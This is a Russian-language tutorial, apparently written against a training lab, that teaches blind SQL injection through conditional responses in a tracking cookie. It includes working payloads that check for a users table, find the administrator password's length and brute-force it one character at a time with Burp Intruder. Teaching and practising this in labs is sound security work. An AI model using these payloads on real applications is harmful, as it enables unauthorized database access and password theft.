# ─── 💀 08_BLIND_SQLi / СЛЕПЫЕ SQL-ИНЪЕКЦИИ ───

**Blind SQLi (Слепая инъекция)** возникает тогда, когда веб-приложение уязвимо к внедрению SQL-кода, но его HTTP-ответы вообще не содержат результатов выполнения запроса или подробных описаний ошибок СУБД. 

В таких условиях классические техники (например, `UNION-based`) становятся **неэффективными**, поскольку они напрямую полагаются на визуализацию вытащенных данных в интерфейсе страницы. Тем не менее, данные все еще можно извлечь, используя посимвольный перебор через условные логические триггеры.

---

### 📑 АРХИТЕКТУРНЫЙ ПРИМЕР (Conditional Responses)

Предположим, приложение использует отслеживающие Cookies для сбора аналитики. Каждый запрос включает заголовок:
`Cookie: TrackingId=u5YD3PapBcR41Ne7Tj4`

На бэкенде этот параметр падает в сырой SQL-запрос для проверки существования пользователя:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingID = 'u5YD3PapBcR41Ne7Tj4'
Результаты запроса пользователю не выводятся, но поведение приложения меняется в зависимости от того, вернула база данных строку или нет. Если TrackingId валидный — на странице отображается маркер (например, строчка “Welcome back!”).

Для проверки уязвимости мы отправляем два запроса с логическими условиями:

xyz' AND '1'='1 (Истинное условие / TRUE) -> Страница выдает “Welcome back!”.

xyz' AND '1'='2 (Ложное условие / FALSE) -> Страница загружается без текста “Welcome back!”.

Если поведение приложения изменилось — параметр полностью уязвим. Мы можем задавать базе любые бинарные вопросы (Да/Нет) и посимвольно вытаскивать пароли.

🛠️ LAB_WALKTHROUGH / ПОШАГОВАЯ ЭКСПЛУАТАЦИЯ
Шаг 1: Перехват и базовый анализ
Запускаем Burp Suite, включаем Intercept и ловим дефолтный GET запрос.

Перенаправляем его в Repeater (Ctrl + R).

Шаг 2: Проверка инъекции и разбор синтаксиса
Внедряем в куки конструкцию: TrackingId=u5YD3PapBcR41Ne7Tj4' AND '1'='1

🧠 Синтаксический разбор пейлоада:
Почему именно ' AND '1'='1?

Первая одинарная кавычка ' закрывает строковый литерал самого сервера.

Оператор AND приказывает СУБД проверить еще одно условие.

Строка '1' закрывает открытую кавычку, база видит текстовую единицу, сравнивает её через = со второй '1.

Финальную закрывающую кавычку для второй единицы допишет сам сервер из своего оригинального кода. Итог на бэкенде: WHERE TrackingID = 'u5YD3PapBcR41Ne7Tj4' AND '1'='1' — синтаксис идеален.

Проверяем ложное условие: TrackingId=u5YD3PapBcR41Ne7Tj4' AND '1'='2

Строка “Welcome back!” полностью исчезла из HTTP-ответа. Приложение уязвимо.

Шаг 3: Проверка существования таблицы и пользователя
Проверяем, существует ли в базе целевая таблица users:

Plaintext
Пейлоад: u5YD3PapBcR41Ne7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a
Если маркер Welcome back! на месте, таблица существует. Теперь проверяем наличие учетной записи administrator:

Plaintext
Пейлоад: u5YD3PapBcR41Ne7Tj4' AND (SELECT username FROM users WHERE username='administrator')='administrator
Маркер снова на месте. Цель подтверждена.

Шаг 4: Определение длины пароля через Intruder
Отправляем запрос из Repeater в Intruder (Ctrl + I). Переходим во вкладку Positions, выбираем тип атаки Sniper и оборачиваем значение длины в маркеры уязвимости:

Plaintext
u5YD3PapBcR41Ne7Tj4' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='administrator
Настройки Payload:

Payload type: Numbers

From: 1

To: 50

Step: 1

Запускаем атаку (Start attack). Сортируем результаты по вкладке Length (длина HTTP-ответа) или ищем статус через Grep - Match по фразе Welcome back!.

На числе 20 длина ответа резко изменилась, и вернулся маркер успеха. Длина пароля администратора — 20 символов.

Шаг 5: Посимвольный брутфорс пароля
Теперь нам нужно поочередно перебрать каждый из 20 символов, используя функцию SUBSTRING.

Выставляем маркеры в Интрудере под два параметра (тип атаки: Cluster Bomb):

Plaintext
u5YD3PapBcR41Ne7Tj4' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
§1§ — Позиция проверяемого символа (от 1 до 20).

§a§ — Сам брутфорс-символ (брутим по словарю a-z, 0-9).

💡 Архитектурная подсказка по ведению логов:
Чтобы не запутаться в процессе брута, открываем соседний терминал в Arch и запускаем текстовый редактор для фиксации символов на лету:

Bash
nvim password_log.txt  # или nano, если нужно быстро закинуть инфу
Пример разбора первых двух шагов:

Для SUBSTRING(password,1,1) смотрим запрос, который вернул измененную длину ответа (выстрелил маркер Welcome back!). Допустим, это символ a. Записываем его в редактор.

Меняем позицию на вторую: SUBSTRING(password,2,1). В Интрудере успешным запросом стреляет символ f. Записываем его.

Повторяем эту процедуру для оставшихся 18 символов, пока не соберем полную строку из 20 знаков.

🏆 Финал: Полный пароль собран, админка скомпрометирована. Поздравляю, концепт Blind SQLi полностью освоен на практике!
